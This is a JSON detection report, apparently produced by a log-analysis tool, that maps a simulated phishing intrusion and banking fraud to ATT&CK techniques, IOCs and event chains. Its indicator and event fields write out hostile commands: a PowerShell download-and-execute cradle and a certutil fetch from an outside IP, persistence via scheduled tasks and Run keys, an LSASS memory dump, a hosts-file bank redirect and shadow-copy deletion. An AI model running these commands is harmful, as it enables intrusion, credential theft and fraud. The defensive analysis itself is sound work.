+      "ts": "2026-10-05T14:21:30",
+      "host": "DC01",
+      "user": "SYSTEM",
+      "process": "",
+      "parent_process": "",
+      "command_line": "successful logon type 3",
+      "command_line_full": "successful logon type 3",
+      "message": "successful logon type 3",
+      "raw": {
+        "@timestamp": "2026-10-05T09:21:30Z",
+        "host.name": "DC01",
+        "user.name": "SYSTEM",
+        "winlog.channel": "Security",
+        "event.code": "4624",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "",
+        "source.ip": "10.10.20.51",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "bux.aziza",
+        "message": "successful logon type 3"
+      },
+      "techniques": [
+        {
+          "technique": "T1021.001",
+          "name": "Remote Desktop Protocol",
+          "confidence": "low",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Security event 4624",
+          "noise": "routine non-RDP logon (4624)"
+        },
+        {
+          "technique": "T1078",
+          "name": "Valid Accounts",
+          "confidence": "low",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Security event 4624",
+          "noise": "routine non-RDP logon (4624)"
+        },
+        {
+          "technique": "T1110",
+          "name": "Brute Force",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "correlation",
+          "evidence": "6 failed logons then success"
+        }
+      ],
+      "primary_technique": "T1110",
+      "primary_confidence": "high",
+      "channel": "Security",
+      "event_id": "4624",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 27,
+      "ts": "2026-10-05T14:23:00",
+      "host": "BUX-PC05",
+      "user": "bux.aziza",
+      "process": "",
+      "parent_process": "",
+      "command_line": "logon type 10 RDP",
+      "command_line_full": "logon type 10 RDP",
+      "message": "logon type 10 RDP",
+      "raw": {
+        "@timestamp": "2026-10-05T09:23:00Z",
+        "host.name": "BUX-PC05",
+        "user.name": "bux.aziza",
+        "winlog.channel": "Security",
+        "event.code": "4624",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "",
+        "source.ip": "10.10.20.51",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "bux.aziza",
+        "message": "logon type 10 RDP"
+      },
+      "techniques": [
+        {
+          "technique": "T1021.001",
+          "name": "Remote Desktop Protocol",
+          "confidence": "medium",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Security event 4624"
+        },
+        {
+          "technique": "T1078",
+          "name": "Valid Accounts",
+          "confidence": "medium",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Security event 4624"
+        }
+      ],
+      "primary_technique": "T1021.001",
+      "primary_confidence": "medium",
+      "channel": "Security",
+      "event_id": "4624",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 28,
+      "ts": "2026-10-05T14:25:14",
+      "host": "BUX-PC05",
+      "user": "bux.aziza",
+      "process": "AnyDesk.exe",
+      "parent_process": "explorer.exe",
+      "command_line": "AnyDesk.exe --silent --start-service",
+      "command_line_full": "AnyDesk.exe --silent --start-service",
+      "message": "remote access tool install",
+      "raw": {
+        "@timestamp": "2026-10-05T09:25:14Z",
+        "host.name": "BUX-PC05",
+        "user.name": "bux.aziza",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "1",
+        "process.name": "AnyDesk.exe",
+        "process.parent.name": "explorer.exe",
+        "process.command_line": "AnyDesk.exe --silent --start-service",
+        "source.ip": "",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "",
+        "message": "remote access tool install"
+      },
+      "techniques": [
+        {
+          "technique": "T1219",
+          "name": "Remote Access Tools",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: AnyDesk.exe --silent --start-service"
+        }
+      ],
+      "primary_technique": "T1219",
+      "primary_confidence": "high",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "1",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 29,
+      "ts": "2026-10-05T14:28:40",
+      "host": "BUX-PC05",
+      "user": "bux.aziza",
+      "process": "cmd.exe",
+      "parent_process": "beacon.exe",
+      "command_line": "cmd.exe /c echo 91.238.50.10 ibank.example.uz >> C:\\Windows\\System32\\drivers\\etc\\hosts",
+      "command_line_full": "cmd.exe /c echo 91.238.50.10 ibank.example.uz >> C:\\Windows\\System32\\drivers\\etc\\hosts",
+      "message": "hosts file modification bank redirect",
+      "raw": {
+        "@timestamp": "2026-10-05T09:28:40Z",
+        "host.name": "BUX-PC05",
+        "user.name": "bux.aziza",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "11",
+        "process.name": "cmd.exe",
+        "process.parent.name": "beacon.exe",
+        "process.command_line": "cmd.exe /c echo 91.238.50.10 ibank.example.uz >> C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "source.ip": "",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "",
+        "message": "hosts file modification bank redirect"
+      },
+      "techniques": [
+        {
+          "technique": "T1565.001",
+          "name": "Stored Data Manipulation",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: cmd.exe /c echo 91.238.50.10 ibank.example.uz >> C..."
+        },
+        {
+          "technique": "T1059.003",
+          "name": "Windows Command Shell",
+          "confidence": "high",
+          "score": 0.9736842105263158,
+          "source": "heuristic",
+          "evidence": "KB search match on: cmd.exe /c echo 91.238.50.10 ibank.example.uz >> C..."
+        }
+      ],
+      "primary_technique": "T1565.001",
+      "primary_confidence": "high",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "11",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 30,
+      "ts": "2026-10-05T14:31:02",
+      "host": "BUX-PC05",
+      "user": "bux.aziza",
+      "process": "1cv8.exe",
+      "parent_process": "explorer.exe",
+      "command_line": "1cv8.exe ENTERPRISE /N buxgalter kl_to_1c.txt payment_order edited",
+      "command_line_full": "1cv8.exe ENTERPRISE /N buxgalter kl_to_1c.txt payment_order edited",
+      "message": "1C payment file manipulation",
+      "raw": {
+        "@timestamp": "2026-10-05T09:31:02Z",
+        "host.name": "BUX-PC05",
+        "user.name": "bux.aziza",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "1",
+        "process.name": "1cv8.exe",
+        "process.parent.name": "explorer.exe",
+        "process.command_line": "1cv8.exe ENTERPRISE /N buxgalter kl_to_1c.txt payment_order edited",
+        "source.ip": "",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "",
+        "message": "1C payment file manipulation"
+      },
+      "techniques": [
+        {
+          "technique": "T1565.001",
+          "name": "Stored Data Manipulation",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: 1cv8.exe ENTERPRISE /N buxgalter kl_to_1c.txt paym..."
+        },
+        {
+          "technique": "T1657",
+          "name": "Financial Theft",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: 1cv8.exe ENTERPRISE /N buxgalter kl_to_1c.txt paym..."
+        }
+      ],
+      "primary_technique": "T1565.001",
+      "primary_confidence": "high",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "1",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 31,
+      "ts": "2026-10-05T14:35:50",
+      "host": "BUX-PC05",
+      "user": "bux.aziza",
+      "process": "vssadmin.exe",
+      "parent_process": "beacon.exe",
+      "command_line": "vssadmin delete shadows /all /quiet",
+      "command_line_full": "vssadmin delete shadows /all /quiet",
+      "message": "inhibit recovery",
+      "raw": {
+        "@timestamp": "2026-10-05T09:35:50Z",
+        "host.name": "BUX-PC05",
+        "user.name": "bux.aziza",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "1",
+        "process.name": "vssadmin.exe",
+        "process.parent.name": "beacon.exe",
+        "process.command_line": "vssadmin delete shadows /all /quiet",
+        "source.ip": "",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "",
+        "message": "inhibit recovery"
+      },
+      "techniques": [
+        {
+          "technique": "T1490",
+          "name": "Inhibit System Recovery",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: vssadmin delete shadows /all /quiet"
+        }
+      ],
+      "primary_technique": "T1490",
+      "primary_confidence": "high",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "1",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 32,
+      "ts": "2026-10-05T14:36:20",
+      "host": "BUX-PC05",
+      "user": "bux.aziza",
+      "process": "",
+      "parent_process": "",
+      "command_line": "the audit log was cleared",
+      "command_line_full": "the audit log was cleared",
+      "message": "the audit log was cleared",
+      "raw": {
+        "@timestamp": "2026-10-05T09:36:20Z",
+        "host.name": "BUX-PC05",
+        "user.name": "bux.aziza",
+        "winlog.channel": "Security",
+        "event.code": "1102",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "",
+        "source.ip": "",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "",
+        "message": "the audit log was cleared"
+      },
+      "techniques": [
+        {
+          "technique": "T1685.005",
+          "name": "Clear Windows Event Logs",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Security event 1102"
+        }
+      ],
+      "primary_technique": "T1685.005",
+      "primary_confidence": "high",
+      "channel": "Security",
+      "event_id": "1102",
+      "source": "win_phishing.csv"
+    }
+  ],
+  "chains": [
+    {
+      "id": 1,
+      "host": "GW-CHECK",
+      "user": "checker",
+      "start": "2026-10-05T13:59:00",
+      "end": "2026-10-05T14:19:00",
+      "events": [
+        0,
+        6,
+        10,
+        15,
+        18
+      ],
+      "tactics": [],
+      "techniques": []
+    },
+    {
+      "id": 2,
+      "host": "HR-PC01",
+      "user": "hr.olim",
+      "start": "2026-10-05T14:01:12",
+      "end": "2026-10-05T14:20:00",
+      "events": [
+        1,
+        2,
+        3,
+        4,
+        5,
+        7,
+        8,
+        9,
+        11,
+        12,
+        13,
+        14,
+        16,
+        17,
+        19
+      ],
+      "tactics": [
+        "initial-access",
+        "execution",
+        "stealth",
+        "command-and-control",
+        "persistence",
+        "privilege-escalation",
+        "defense-impairment",
+        "discovery",
+        "credential-access"
+      ],
+      "techniques": [
+        "T1566.001",
+        "T1059.005",
+        "T1059.001",
+        "T1027",
+        "T1105",
+        "T1071",
+        "T1053.005",
+        "T1112",
+        "T1547.001",
+        "T1135",
+        "T1018",
+        "T1069.002",
+        "T1003.001"
+      ]
+    },
+    {
+      "id": 3,
+      "host": "DC01",
+      "user": "SYSTEM",
+      "start": "2026-10-05T14:20:11",
+      "end": "2026-10-05T14:21:30",
+      "events": [
+        20,
+        21,
+        22,
+        23,
+        24,
+        25,
+        26
+      ],
+      "tactics": [
+        "credential-access"
+      ],
+      "techniques": [
+        "T1110",
+        "T1021.001",
+        "T1078"
+      ]
+    },
+    {
+      "id": 4,
+      "host": "BUX-PC05",
+      "user": "bux.aziza",
+      "start": "2026-10-05T14:23:00",
+      "end": "2026-10-05T14:36:20",
+      "events": [
+        27,
+        28,
+        29,
+        30,
+        31,
+        32
+      ],
+      "tactics": [
+        "lateral-movement",
+        "stealth",
+        "persistence",
+        "privilege-escalation",
+        "initial-access",
+        "command-and-control",
+        "impact",
+        "execution",
+        "defense-impairment"
+      ],
+      "techniques": [
+        "T1021.001",
+        "T1078",
+        "T1219",
+        "T1565.001",
+        "T1059.003",
+        "T1657",
+        "T1490",
+        "T1685.005"
+      ]
+    }
+  ],
+  "iocs": [
+    {
+      "type": "ip",
+      "value": "172.16.9.9",
+      "count": 5,
+      "first": "2026-10-05T13:59:00",
+      "last": "2026-10-05T14:19:00",
+      "sources": [
+        "win_phishing.csv"
+      ]
+    },
+    {
+      "type": "ip",
+      "value": "10.10.20.60",
+      "count": 5,
+      "first": "2026-10-05T13:59:00",
+      "last": "2026-10-05T14:19:00",
+      "sources": [
+        "win_phishing.csv"
+      ]
+    },
+    {
+      "type": "unix_path",
+      "value": "GET /health",
+      "count": 5,
+      "first": "2026-10-05T13:59:00",
+      "last": "2026-10-05T14:19:00",
+      "sources": [
+        "win_phishing.csv"
+      ]
+    },
+    {
+      "type": "win_path",
+      "value": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE /n rezyume.docm",
+      "count": 1,
+      "first": "2026-10-05T14:01:12",
+      "last": "2026-10-05T14:01:12",
+      "sources": [
+        "win_phishing.csv"
+      ]
+    },
+    {
+      "type": "unix_path",
+      "value": "IEX (New-Object Net.WebClient).DownloadString('http://45.142.212.61/a.ps1')",
+      "count": 1,
+      "first": "2026-10-05T14:01:59",
+      "last": "2026-10-05T14:01:59",
+      "sources": [
+        "win_phishing.csv"
+      ]
+    },
+    {
+      "type": "unix_path",
+      "value": "certutil.exe -urlcache -split -f http://45.142.212.61/beacon.exe C:\\Users\\hr.olim\\AppData\\Local\\Temp\\beacon.exe",
+      "count": 1,
+      "first": "2026-10-05T14:02:20",
+      "last": "2026-10-05T14:02:20",
+      "sources": [
+        "win_phishing.csv"
+      ]
+    },
+    {
+      "type": "ip",
+      "value": "10.10.20.51",
+      "count": 13,
+      "first": "2026-10-05T14:02:35",
+      "last": "2026-10-05T14:23:00",
+      "sources": [
+        "win_phishing.csv"
+      ]
+    },
+    {
+      "type": "ip",
+      "value": "45.142.212.61",
+      "count": 5,
+      "first": "2026-10-05T14:02:35",
+      "last": "2026-10-05T14:20:00",
+      "sources": [
+        "win_phishing.csv"
+      ]
+    },
+    {
+      "type": "unix_path",
+      "value": "schtasks /create /sc onlogon /tn Updater /tr C:\\Users\\hr.olim\\AppData\\Local\\Temp\\beacon.exe",
+      "count": 1,
+      "first": "2026-10-05T14:07:10",
+      "last": "2026-10-05T14:07:10",
+      "sources": [
+        "win_phishing.csv"
+      ]
+    },
+    {
+      "type": "unix_path",
+      "value": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Users\\hr.olim\\AppData\\Local\\Temp\\beacon.exe /f",
+      "count": 1,
+      "first": "2026-10-05T14:07:40",
+      "last": "2026-10-05T14:07:40",
+      "sources": [
+        "win_phishing.csv"
+      ]
+    },
+    {
+      "type": "unix_path",
+      "value": "net view /domain",
+      "count": 1,
+      "first": "2026-10-05T14:12:03",
+      "last": "2026-10-05T14:12:03",
+      "sources": [
+        "win_phishing.csv"
+      ]
+    },
+    {
+      "type": "unix_path",
+      "value": "nltest /dclist:corp.local",
+      "count": 1,
+      "first": "2026-10-05T14:12:20",
+      "last": "2026-10-05T14:12:20",
+      "sources": [
+        "win_phishing.csv"
+      ]
+    },
+    {
+      "type": "unix_path",
+      "value": "net group \"Domain Admins\" /domain",
+      "count": 1,
+      "first": "2026-10-05T14:12:41",
+      "last": "2026-10-05T14:12:41",
+      "sources": [
+        "win_phishing.csv"
+      ]
+    },
+    {
+      "type": "win_path",
+      "value": "C:\\Windows\\System32\\rundll32.exe comsvcs.dll, MiniDump 720 C:\\Windows\\Temp\\lsass.dmp full",
+      "count": 1,
+      "first": "2026-10-05T14:14:05",
+      "last": "2026-10-05T14:14:05",
+      "sources": [
+        "win_phishing.csv"
+      ]
+    },
+    {
+      "type": "unix_path",
+      "value": "cmd.exe /c echo 91.238.50.10 ibank.example.uz >> C:\\Windows\\System32\\drivers\\etc\\hosts",
+      "count": 1,
+      "first": "2026-10-05T14:28:40",
+      "last": "2026-10-05T14:28:40",
+      "sources": [
+        "win_phishing.csv"
+      ]
+    },
+    {
+      "type": "unix_path",
+      "value": "1cv8.exe ENTERPRISE /N buxgalter kl_to_1c.txt payment_order edited",
+      "count": 1,
+      "first": "2026-10-05T14:31:02",
+      "last": "2026-10-05T14:31:02",
+      "sources": [
+        "win_phishing.csv"
+      ]
+    },
+    {
+      "type": "unix_path",
+      "value": "vssadmin delete shadows /all /quiet",
+      "count": 1,
+      "first": "2026-10-05T14:35:50",
+      "last": "2026-10-05T14:35:50",
+      "sources": [
+        "win_phishing.csv"
+      ]
+    }
+  ],
+  "coverage": [
+    {
+      "shortname": "reconnaissance",
+      "name": "Reconnaissance",
+      "observed": [],
+      "missing": true
+    },
+    {
+      "shortname": "resource-development",
+      "name": "Resource Development",
+      "observed": [],
+      "missing": true
+    },
+    {
+      "shortname": "initial-access",
+      "name": "Initial Access",
+      "observed": [
+        "T1078",
+        "T1566.001"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "execution",
+      "name": "Execution",
+      "observed": [
+        "T1059.003",
+        "T1059.005",
+        "T1053.005",
+        "T1059.001"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "persistence",
+      "name": "Persistence",
+      "observed": [
+        "T1112",
+        "T1078",
+        "T1547.001",
+        "T1053.005"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "privilege-escalation",
+      "name": "Privilege Escalation",
+      "observed": [
+        "T1078",
+        "T1547.001",
+        "T1053.005"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "stealth",
+      "name": "Stealth",
+      "observed": [
+        "T1078",
+        "T1027"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "defense-impairment",
+      "name": "Defense Impairment",
+      "observed": [
+        "T1112",
+        "T1685.005"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "credential-access",
+      "name": "Credential Access",
+      "observed": [
+        "T1003.001",
+        "T1110"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "discovery",
+      "name": "Discovery",
+      "observed": [
+        "T1018",
+        "T1135",
+        "T1069.002"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "lateral-movement",
+      "name": "Lateral Movement",
+      "observed": [
+        "T1021.001"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "collection",
+      "name": "Collection",
+      "observed": [],
+      "missing": true
+    },
+    {
+      "shortname": "command-and-control",
+      "name": "Command and Control",
+      "observed": [
+        "T1105",
+        "T1219"
+      ],
+      "missing": false
+    },
+    {
+      "shortname": "exfiltration",
+      "name": "Exfiltration",
+      "observed": [],
+      "missing": true
+    },
+    {
+      "shortname": "impact",
+      "name": "Impact",
+      "observed": [
+        "T1565.001",
+        "T1657",
+        "T1490"
+      ],
+      "missing": false
+    }
+  ],
+  "checkers": [
+    {
+      "src": "172.16.9.9",
+      "dst": "10.10.20.60",
+      "key": "172.16.9.9 -> 10.10.20.60 (GET /health)",
+      "count": 5,
+      "interval_seconds": 300.0,
+      "first": "2026-10-05T13:59:00",
+      "last": "2026-10-05T14:19:00",
+      "sample_evidence": "davriy \u2014 checker yoki C2 beacon bo'lishi mumkin"
+    },
+    {
+      "src": "10.10.20.51",
+      "dst": "45.142.212.61",
+      "key": "10.10.20.51 -> 45.142.212.61 (beacon.exe)",
+      "count": 5,
+      "interval_seconds": 300.0,
+      "first": "2026-10-05T14:02:35",
+      "last": "2026-10-05T14:20:00",
+      "sample_evidence": "davriy \u2014 checker yoki C2 beacon bo'lishi mumkin"
+    }
+  ],
+  "stats": {
+    "events": 33,
+    "events_with_hits": 28,
+    "suppressed_by_noise": 0,
+    "deep": false,
+    "tz": "+05:00",
+    "src_tz": "+05:00"
+  }
+}
